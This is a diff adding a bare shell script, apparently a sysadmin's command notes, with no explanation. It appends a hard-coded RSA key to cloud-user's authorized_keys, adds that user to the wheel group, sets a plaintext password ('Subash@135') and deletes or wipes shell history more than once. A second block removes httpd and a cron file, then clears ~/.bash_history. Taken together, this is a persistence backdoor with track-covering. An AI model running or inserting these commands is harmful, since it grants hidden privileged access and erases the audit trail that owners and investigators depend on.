@@ -1,0 +1,25 @@
+/home/cloud-user/.ssh/authorized_keys;
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkdLRDQRl+ICIypjiYARQTMhyRAR8uFcGPqypSKJA+8QkX4q5v+KdXWDgUazKeRI1yXwoJX+ebzASsJdnN4VGOFw9PbRaERITgZ5SdidREFGpy+Ub12OkQZt0RKgIr2/MEJ6lFbFElIt+iN94Y/aw9FA/UNfetAdqKsDILW1//icAJOCPAOBNybE8p5abjYC6LkDLDZPhx3JV8nXWvP6CmqTiSguf1OehqlnG4A70eXNJUQRiAKZz/Z3oCRnnimFKQDiwwsyJOErzxBDVNaSvjmXPzPQhV92IOFaR5denVvBEjI3Orm4paGt7GCbm0yO8S4RRfZDcOHMYvHyI2jC5Aw== cloud-user" >> /home/cloud-user/.ssh/authorized_keys;
+chown cloud-user:cloud-user /home/cloud-user/.ssh/authorized_keys;
+chown cloud-user:cloud-user /home/cloud-user/.ssh;
+chmod 700  /home/cloud-user/.ssh;
+chmod 600 /home/cloud-user/.ssh/authorized_keys;
+usermod -aG  wheel cloud-user;
+echo "Subash@135" | passwd --stdin "cloud-user";
+history -c;
+
+
+for h in $(seq 999 1008); do history -d 1006; done; history -d $(history 1 | awk '{print $1}')
+
+
+#!/bin/bash
+yum -y remove httpd
+rm -rf /root/test.txt
+rm -rf /etc/cron.d/remove.cron
+history -c
+cat /dev/null > ~/.bash_history
+
+public-key==================
+
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkdLRDQRl+ICIypjiYARQTMhyRAR8uFcGPqypSKJA+8QkX4q5v+KdXWDgUazKeRI1yXwoJX+ebzASsJdnN4VGOFw9PbRaERITgZ5SdidREFGpy+Ub12OkQZt0RKgIr2/MEJ6lFbFElIt+iN94Y/aw9FA/UNfetAdqKsDILW1//icAJOCPAOBNybE8p5abjYC6LkDLDZPhx3JV8nXWvP6CmqTiSguf1OehqlnG4A70eXNJUQRiAKZz/Z3oCRnnimFKQDiwwsyJOErzxBDVNaSvjmXPzPQhV92IOFaR5denVvBEjI3Orm4paGt7GCbm0yO8S4RRfZDcOHMYvHyI2jC5Aw== cloud-user
